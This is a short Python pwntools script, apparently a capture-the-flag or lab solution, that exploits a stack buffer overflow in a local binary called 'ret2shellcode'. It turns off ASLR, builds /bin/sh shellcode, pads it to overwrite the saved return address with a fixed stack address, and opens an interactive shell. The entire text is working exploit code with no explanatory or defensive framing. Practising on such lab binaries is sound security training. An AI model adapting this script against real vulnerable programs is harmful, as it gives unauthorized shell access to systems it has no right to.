#!/usr/bin/env python
from pwn import *
context.aslr = False
sh = process('./ret2shellcode')
# gdb.attach(sh,'b *0x08048593')
shellcode = asm(shellcraft.sh())
pause()
sh.sendline(shellcode.ljust(0x6c+4, b'B') + p32(0xffffc8cc))
# sh.sendline(shellcode.ljust(112,b'A'))
sh.interactive()

